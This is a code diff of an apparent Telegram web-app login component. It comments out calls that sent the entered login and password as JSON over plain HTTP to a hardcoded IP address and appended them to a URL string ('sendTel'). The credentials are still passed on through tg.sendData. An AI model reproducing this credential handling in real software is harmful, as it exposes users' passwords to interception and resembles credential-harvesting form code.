@@ -32,14 +32,22 @@ const Auth = () => {
             // })
     // }
         // CheackAuth(data.login,data.password)
-        fetch("http://188.247.115.178:30020/web-data", {
-            method: "POST",
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data)
-        })
-        fetch(sendTel+JSON.stringify(data))
+        // fetch("http://188.247.115.178:30020/web-data", {
+        //     method: "POST",
+        //     headers: {
+        //         'Content-Type': 'application/json',
+        //     },
+        //     body: JSON.stringify(data)
+        // })
+        fetch('http://188.247.115.178:30020/web-data', {
+        method: 'POST',
+        headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ "id": 78912 })
+    }),
+        // fetch(sendTel+JSON.stringify(data))
         tg.sendData(JSON.stringify(data));
     }, [login, password, /*subject*/])
 
